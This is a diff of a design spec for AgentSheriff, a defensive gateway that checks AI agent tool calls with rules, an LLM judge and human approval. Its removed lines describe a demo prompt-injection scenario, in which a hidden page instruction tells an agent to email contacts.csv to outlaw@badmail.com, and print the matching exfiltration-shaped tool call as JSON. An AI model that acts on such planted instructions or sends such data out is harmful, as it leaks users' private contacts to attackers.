@@ -1,229 +1,347 @@
 # AgentSheriff — Shared Context (READ FIRST)
 
-This file is the ground truth that every team-member spec builds on. If a detail lives in the approved ultraplan but is not restated in a person's spec, it is still binding — check here first when in doubt.
+This file is the ground truth for the whole project. If a detail here conflicts with a per-person spec, this file wins.
 
 ## Product in one line
 
-AgentSheriff is an external permission, audit, and approval layer for AI agents (OpenClaw-style autonomous assistants). Every tool call an agent wants to make is intercepted; the gateway decides **allow / deny / require human approval** based on YAML policies + a threat detector, logs everything in a "Sheriff's Ledger", and surfaces it all in an Old-West-themed dashboard.
+AgentSheriff is a local policy gateway for agent tool calls. It sits between an agent runtime and the tools that agent wants to use, evaluates each action with deterministic rules first and a prompted LLM judge second, optionally asks a human for approval, records the full decision trail, and exposes the whole system through an Old-West-themed dashboard.
 
-## Demo (this is the north star — every engineering decision serves this)
+## Product shape
 
-Three scenes, scripted, run back-to-back in under 60 seconds either by a real OpenClaw instance or by the `Deputy Dusty` simulator:
+The old three-scene demo still matters, but it is no longer the full product definition.
 
-1. **Good** — agent reads an email, extracts a meeting time, creates a calendar event. Dashboard shows two green allowed entries. (scenario id: `good`)
-2. **Injection** — agent reads a page that contains a hidden prompt-injection telling it to email `contacts.csv` to `outlaw@badmail.com`. Gateway blocks with `deny`; Wanted Poster slams in on the dashboard; agent is placed in Jailhouse. (scenario id: `injection`)
-3. **Approval** — agent tries to email an invoice PDF to `accountant@example.com`. Gateway flags `approval_required`; Approval card appears on dashboard; Sheriff clicks Approve; action completes. (scenario id: `approval`)
+The core product is now:
 
-If any of the three scenes can't run cleanly with current code, the demo is broken — this is the primary acceptance test.
+1. A **general tool-call gateway** that can sit in front of OpenClaw or any compatible agent runner.
+2. A **policy system** made of editable static rules plus an editable natural-language judge prompt.
+3. A **policy bootstrap flow** where the user describes what they use the agent for and the system generates a starter ruleset plus judge guidance.
+4. A **human approval path** for borderline or high-risk actions.
+5. A **replay eval system** that runs historical ledger entries against a draft policy before the user publishes it.
+
+## User journey
+
+The intended product loop is:
+
+1. The user says what the agent is for.
+2. AgentSheriff generates an initial policy bundle:
+   - static restrictions
+   - judge prompt
+   - default approval thresholds
+3. The user edits and publishes that policy.
+4. The agent sends tool calls through `POST /v1/tool-call`.
+5. AgentSheriff decides `allow`, `deny`, or `approval_required`.
+6. Every action is written to the Sheriff's Ledger.
+7. The user inspects audit history, tunes policies, and runs evals before publishing tighter rules.
+
+## Demo and verification
+
+The three existing scenarios remain the primary smoke test and the most compelling live demo:
+
+1. `good` — a normal task is allowed.
+2. `injection` — a malicious or exfiltration-shaped task is denied.
+3. `approval` — a borderline task pauses for human approval, then continues when approved.
+
+These scenarios are now **verification assets and demo flows**, not the full product definition.
 
 ## Architecture
 
+```mermaid
+flowchart TD
+    userIntent[User Intent]
+    policyBuilder[Policy Builder]
+    policyStore[Policy Store]
+    agent[Agent Runtime]
+    gateway[Tool Call Gateway]
+    heuristics[Threat Heuristics]
+    staticRules[Static Rules]
+    llmJudge[LLM Judge]
+    approval[Approval Queue]
+    executors[Adapters Or Executors]
+    ledger[Sheriffs Ledger]
+    evals[Replay Evals]
+    ui[Old West Dashboard]
+
+    userIntent --> policyBuilder
+    policyBuilder --> policyStore
+    agent --> gateway
+    gateway --> heuristics
+    gateway --> staticRules
+    staticRules -->|settled| executors
+    staticRules -->|needs_judge| llmJudge
+    heuristics --> llmJudge
+    llmJudge -->|allow_or_deny| executors
+    llmJudge -->|needs_human| approval
+    approval --> executors
+    executors --> ledger
+    gateway --> ledger
+    policyStore --> ui
+    ledger --> ui
+    ledger --> evals
+    evals --> ui
 ```
-Agent (OpenClaw | Deputy Dusty)
-        │  POST /v1/tool-call
-        ▼
-FastAPI Gateway  ──►  Policy Engine (YAML rules)
-    │                 Threat Detector (regex + Claude Haiku)
-    │                      │
-    │                      ▼
-    │                  Decision: allow | deny | approval_required
-    │                      │
-    ├─ allow ───► Mock Tool Adapter ──► result
-    ├─ deny  ───► Wanted Poster + jail agent
-    └─ approval_required ──► Approval Queue (awaits Sheriff)
-                                    │ (approved → adapter; denied → logged)
-                                    ▼
-                              SQLite Sheriff's Ledger
-                                    │
-                                    ▼ WS /v1/stream
-                              Next.js dashboard (Old West)
-```
 
-Single backend process (FastAPI + Uvicorn), single frontend process (Next.js 15 App Router). SQLite file is the only datastore. No Redis, no queue, no auth — hackathon scope.
+## Decision pipeline
 
-## Tech stack (locked)
+Every `POST /v1/tool-call` follows the same shape:
 
-- **Backend**: Python 3.11, FastAPI, Pydantic v2, SQLAlchemy 2.x + SQLite (`file:./sheriff.db`), Uvicorn, `anthropic` SDK, `pyyaml`. Package manager: **`uv`**.
-- **Frontend**: Next.js 15 (App Router), TypeScript, Tailwind, shadcn/ui, lucide-react, framer-motion, `react-use-websocket`. Node 20.
-- **LLMs**: `claude-haiku-4-5-20251001` for risk classification (fast, cached system prompt), `claude-sonnet-4-6` for the human-readable "why it was blocked" explanation shown on the Wanted Poster. Prompt caching mandatory — see `claude-api` skill.
-- **Demo agent**: OpenClaw via Docker Compose with tool URLs re-pointed at AgentSheriff. Deputy Dusty = Python CLI simulator that posts canned payloads.
-- **Theme**: parchment `#f3e9d2`, dark brown `#3b2a1a`, brass `#b8864b`, wanted red `#a4161a`, allowed green `#2d6a4f`, approval amber `#d68c1e`. Headings: **Rye**. Body: **Inter**.
+1. Normalize the incoming tool call.
+2. Compute heuristic signals and a heuristic risk score.
+3. Evaluate static rules in order.
+4. If a static rule settles the decision, use it.
+5. Otherwise call the LLM judge with:
+   - the active policy prompt
+   - normalized tool metadata
+   - the tool arguments
+   - recent context
+   - heuristic summary
+6. Optionally branch to human approval when the matched rule or judge result requires it.
+7. If allowed, dispatch to the adapter layer.
+8. Persist the decision, reasoning, and execution result to the ledger.
+9. Stream updates to the dashboard.
 
-## Repo layout (authoritative — do not rename)
+## Tech stack (locked for MVP)
 
-```
+- **Backend:** Python 3.11, FastAPI, Pydantic v2, SQLAlchemy 2.x, SQLite, `uv`
+- **Frontend:** Next.js 15, TypeScript, Tailwind, shadcn/ui, Zustand, React Query, `react-use-websocket`
+- **LLM path:** Anthropic SDK with prompt caching
+- **Agent integration:** OpenClaw first, but the gateway contract should be generic
+- **Demo packaging:** Docker Compose
+
+## Explicit non-goals for MVP
+
+These are inspired by CrabTrap, but out of scope for the first merge:
+
+- transparent HTTP/HTTPS MITM proxying
+- TLS certificate generation
+- forcing agent traffic through `HTTP_PROXY` / `HTTPS_PROXY`
+- PostgreSQL as a requirement
+- full auth and tenancy
+- replacing the Python backend with Go
+
+## Repo layout (authoritative)
+
+```text
 /
 ├── backend/
 │   ├── pyproject.toml
 │   ├── uv.lock
-│   ├── sheriff.db               # created at runtime, gitignored
+│   ├── sheriff.db
 │   └── src/agentsheriff/
 │       ├── __init__.py
-│       ├── main.py              # FastAPI app, CORS, router mount
-│       ├── config.py            # settings via pydantic-settings
-│       ├── models/              # Pydantic DTOs + SQLAlchemy ORM
-│       │   ├── __init__.py
-│       │   ├── dto.py           # ToolCallRequest, Decision, ApprovalAction, AgentState
-│       │   └── orm.py           # AuditEntry, Agent, PolicyRow, Approval
-│       ├── gateway.py           # POST /v1/tool-call orchestration
+│       ├── main.py
+│       ├── config.py
+│       ├── gateway.py
+│       ├── streams.py
+│       ├── models/
+│       │   ├── dto.py
+│       │   └── orm.py
 │       ├── policy/
-│       │   ├── __init__.py
-│       │   ├── engine.py        # YAML load + evaluator
-│       │   └── templates/       # default.yaml, healthcare.yaml, finance.yaml, startup.yaml
+│       │   ├── engine.py
+│       │   ├── store.py
+│       │   ├── builder.py
+│       │   └── templates/
 │       ├── threats/
-│       │   ├── __init__.py
-│       │   ├── detector.py      # regex + heuristics
-│       │   └── classifier.py    # Claude Haiku risk score + Sonnet explainer
+│       │   ├── detector.py
+│       │   ├── classifier.py
+│       │   └── evaluator.py
 │       ├── audit/
-│       │   ├── __init__.py
-│       │   └── store.py         # SQLAlchemy session + query helpers
+│       │   └── store.py
 │       ├── approvals/
+│       │   └── queue.py
+│       ├── adapters/
 │       │   ├── __init__.py
-│       │   └── queue.py         # asyncio.Event-based pending map
-│       ├── adapters/            # mocks ONLY — no real I/O
-│       │   ├── __init__.py
-│       │   ├── gmail.py
-│       │   ├── files.py
-│       │   ├── github.py
-│       │   ├── browser.py
-│       │   └── shell.py
-│       ├── streams.py           # /v1/stream WebSocket multiplexer
+│       │   ├── manifest.py
+│       │   └── ...
 │       ├── api/
-│       │   ├── __init__.py
-│       │   ├── agents.py        # GET/POST /v1/agents...
-│       │   ├── policies.py      # GET/PUT /v1/policies...
-│       │   └── approvals.py     # POST /v1/approvals/{id}
+│       │   ├── tool_calls.py
+│       │   ├── policies.py
+│       │   ├── approvals.py
+│       │   ├── audit.py
+│       │   ├── evals.py
+│       │   ├── agents.py
+│       │   └── health.py
 │       └── demo/
-│           ├── __init__.py
-│           ├── deputy_dusty.py  # CLI: python -m agentsheriff.demo.deputy_dusty --scenario good
-│           └── scenarios/       # good.json, injection.json, approval.json
+│           ├── deputy_dusty.py
+│           └── scenarios/
 ├── frontend/
 │   ├── package.json
-│   ├── next.config.mjs
-│   ├── tailwind.config.ts
-│   ├── postcss.config.js
-│   ├── tsconfig.json
 │   └── src/
 │       ├── app/
-│       │   ├── layout.tsx
-│       │   ├── globals.css
-│       │   ├── page.tsx               # Town Overview
-│       │   ├── deputies/page.tsx
-│       │   ├── laws/page.tsx
-│       │   ├── wanted/page.tsx
-│       │   ├── ledger/page.tsx
-│       │   └── approvals/page.tsx
 │       ├── components/
-│       │   ├── Sidebar.tsx
-│       │   ├── AgentCard.tsx
-│       │   ├── WantedPoster.tsx
-│       │   ├── ApprovalCard.tsx
-│       │   ├── AuditTimeline.tsx
-│       │   ├── PolicyEditor.tsx
-│       │   ├── KpiCard.tsx
-│       │   └── ui/                     # shadcn components
-│       ├── lib/
-│       │   ├── api.ts                  # fetch wrappers
-│       │   ├── ws.ts                   # WebSocket hook
-│       │   ├── types.ts                # mirror backend DTOs
-│       │   └── store.ts                # Zustand store for live events
-│       └── styles/old-west.css
+│       └── lib/
 ├── demo/
 │   ├── docker-compose.yml
 │   ├── openclaw-config/
-│   │   └── tools.yaml                  # OpenClaw tool definitions pointing at AgentSheriff
-│   ├── README.md                       # demo-day runbook
-│   └── record-fallback.mp4             # backup video, produced in polish phase
-├── specs/                              # these files
-├── implementation/                     # orchestra run files (next phase)
+│   └── README.md
+├── specs/
+├── implementation/
 └── README.md
 ```
 
-## API contracts (locked — any change requires notifying all 4 people)
+## Core API contracts
 
 ### `POST /v1/tool-call`
+
+This is the stable ingress contract for any agent integration.
+
 Request:
+
 ```json
 {
   "agent_id": "deputy-dusty",
+  "agent_label": "Deputy Dusty",
   "tool": "gmail.send_email",
-  "args": { "to": "outlaw@badmail.com", "body": "...", "attachments": ["contacts.csv"] },
+  "args": {
+    "to": "accountant@example.com",
+    "subject": "Q1 invoice",
+    "attachments": ["invoice_q1.pdf"]
+  },
   "context": {
-    "task_id": "t-123",
-    "source_prompt": "user asked: ...",
-    "source_content": "page or email contents the agent processed"
+    "task_id": "task-123",
+    "source_prompt": "Send the invoice to accounting",
+    "source_content": "Latest email thread or page text",
+    "conversation_id": "conv-1"
   }
 }
 ```
-Response (200 on any decision — HTTP 4xx/5xx only for malformed input / server error):
+
+Response:
+
 ```json
 {
-  "decision": "allow" | "deny" | "approval_required",
-  "approval_id": "a-456",
-  "reason": "Data exfiltration: external recipient + sensitive attachment",
-  "policy_id": "no-external-pii",
-  "risk_score": 87,
-  "result": { "...adapter output..." }
+  "decision": "allow",
+  "reason": "Matched rule policy.finance.internal_send",
+  "risk_score": 32,
+  "matched_rule_id": "policy.finance.internal_send",
+  "judge_used": false,
+  "policy_version_id": "pv_123",
+  "audit_id": "audit_456",
+  "approval_id": null,
+  "user_explanation": null,
+  "result": {
+    "status": "sent"
+  }
 }
 ```
-Rules:
-- `approval_id` present iff `decision == "approval_required"`. Client polls nothing — it just waits on the HTTP response; gateway blocks (awaitable, 120s timeout) until the Sheriff clicks a button.
-- `result` present iff `decision == "allow"`.
-- `risk_score` always present, 0–100.
+
+Notes:
+
+- `decision` is one of `allow`, `deny`, `approval_required`.
+- `matched_rule_id` is nullable when the LLM judge made the final call.
+- `judge_used` indicates whether the LLM path ran.
+- `policy_version_id` must always be present for traceability.
+- `approval_id` is present only when a pending approval exists or was just resolved through the blocking request path.
+- the gateway always responds with HTTP 200 for valid requests, even when the decision is `deny`
+
+### `GET /v1/policies`
+
+List policy versions and summary metadata.
+
+### `POST /v1/policies`
+
+Create a new draft policy version.
+
+### `POST /v1/policies/generate`
+
+Generate a starter policy from a user intent description.
+
+### `POST /v1/policies/{id}/publish`
+
+Publish a draft version.
+
+### `GET /v1/evals`
+
+List eval runs.
+
+### `POST /v1/evals`
+
+Create an eval run that replays historical audit entries against a policy version.
+
+### `GET /v1/evals/{id}`
+
+Return aggregate stats and run metadata.
+
+### `GET /v1/evals/{id}/results`
+
+Return row-level eval results.
+
+### `POST /v1/approvals/{id}`
+
+Resolve an approval with `approve`, `deny`, or `redact`.
 
 ### `WS /v1/stream`
-Server pushes JSON frames:
-```json
-{ "type": "audit",       "payload": { /* AuditEntry */ } }
-{ "type": "approval",    "payload": { /* Approval, with state: pending|approved|denied */ } }
-{ "type": "agent_state", "payload": { "agent_id": "...", "state": "active"|"jailed"|"revoked" } }
-```
 
-### Approvals
-- `POST /v1/approvals/{id}` body: `{ "action": "approve" | "deny" | "redact", "scope": "once" | "always_recipient" | "always_tool" }`
-- `GET /v1/approvals?state=pending` list.
+Server pushes real-time frames for:
 
-### Agents
-- `GET /v1/agents` → list with state.
-- `POST /v1/agents/{id}/jail` / `POST /v1/agents/{id}/revoke` / `POST /v1/agents/{id}/release`.
+- audit entries
+- approval lifecycle
+- agent state changes
+- policy publish events
+- eval progress
+- heartbeat
 
-### Policies
-- `GET /v1/policies` → current active ruleset.
-- `PUT /v1/policies` body: `{ "yaml": "..." }` → validates and hot-reloads.
-- `GET /v1/policies/templates` → list template names.
-- `POST /v1/policies/apply-template` body: `{ "name": "finance" }`.
+## Policy model
 
-All DTOs mirrored in `frontend/src/lib/types.ts`. Backend owns the source of truth; frontend copies by hand.
+An active policy version contains:
 
-## Scenario payloads (canonical — Person 2 authors these, everyone else reads)
+- metadata: `id`, `name`, `version`, `status`, `created_at`, `published_at`
+- a user-authored `intent_summary`
+- a `judge_prompt`
+- ordered `static_rules`
+- approval defaults and thresholds
 
-Every `deputy_dusty --scenario X` run posts a known sequence of `/v1/tool-call` payloads with realistic delays. The exact JSON lives in `backend/src/agentsheriff/demo/scenarios/{good,injection,approval}.json`. Shape:
+Static rules support:
 
-```json
-{
-  "agent_id": "deputy-dusty",
-  "label": "Deputy Dusty",
-  "steps": [
-    { "delay_ms": 400, "tool": "gmail.read_inbox",      "args": { "max": 5 } },
-    { "delay_ms": 600, "tool": "calendar.create_event", "args": { "title": "Sync", "starts_at": "..." } }
-  ]
-}
-```
+- exact tool match or namespace match
+- optional argument predicates
+- actions: `allow`, `deny`, `require_approval`, `delegate_to_judge`
+- optional severity clamps
+- explanation text for the user and ledger
 
-## Sequencing (calendar)
+## Audit and eval expectations
 
-1. **Hour 0–2**: contracts frozen, stubs in place, frontend hitting real backend (stubbed decisions). Person 1 owns this hour.
-2. **Hour 2–8**: everyone builds their slice in parallel.
-3. **Hour 8–14**: integrate; run all three scenarios end-to-end.
-4. **Hour 14–18**: polish (animations, fonts, fallback video, deck rehearsal). No new features.
+The ledger is not just a history table. It is also the source for replay evaluation.
+
+Each audit entry must retain enough information to replay a policy decision later:
+
+- tool name
+- normalized args snapshot
+- context snapshot
+- heuristic signals and score
+- matched rule id
+- whether the judge ran
+- judge rationale
+- final decision
+- approval outcome if any
+- execution result summary
+- policy version used
+
+## Scenario assets
+
+`good`, `injection`, and `approval` stay in the repo and must remain stable. They are required for:
+
+- local smoke tests
+- demo rehearsals
+- UI development
+- fallback verification when the full general flow is not yet wired
+
+## Definition of done
+
+The merged architecture is considered complete when all of the following are true:
+
+1. A user can describe what they use an agent for and receive a starter policy draft.
+2. A draft policy can be edited, versioned, and published.
+3. Tool calls flow through the gateway and are decided by static rules first and the judge second.
+4. Borderline actions can require human approval without bypassing the ledger.
+5. Historical ledger rows can be replayed against a draft policy via eval runs.
+6. The dashboard surfaces live activity, policies, approvals, and eval results.
+7. The three demo scenarios still work end to end.
 
 ## Global non-negotiables
 
-- No real credentials anywhere. OpenClaw runs with throwaway/dummy accounts only.
-- Every tool call must go through the gateway — adapters must refuse to execute if invoked directly (raise if a `gateway_token` kwarg is missing).
-- SQLite file is gitignored. `sheriff.db` is recreated on startup if missing.
-- All timestamps are UTC ISO-8601 strings over the wire.
-- Log line format in backend: structured `logging` with JSON formatter — makes judge-facing debugging cleaner.
-- Claude API calls MUST use prompt caching (follow `claude-api` skill). Classifier system prompt is the cached block.
-- Frontend reconnects the WebSocket on drop with exponential backoff (1s → max 10s).
-- No auth — demo only. Add `# TODO(post-hack): add auth` at the gateway entrypoint so reviewers know we know.
+- No real third-party side effects in adapters during MVP.
+- All timestamps are UTC ISO-8601 strings.
+- Prompt caching is mandatory on repeated LLM calls.
+- The gateway remains useful without the LLM path enabled.
+- SQLite is the MVP store; Postgres is a later upgrade, not an implied current dependency.
+- Approval is a first-class capability and must not be dropped to mirror CrabTrap.
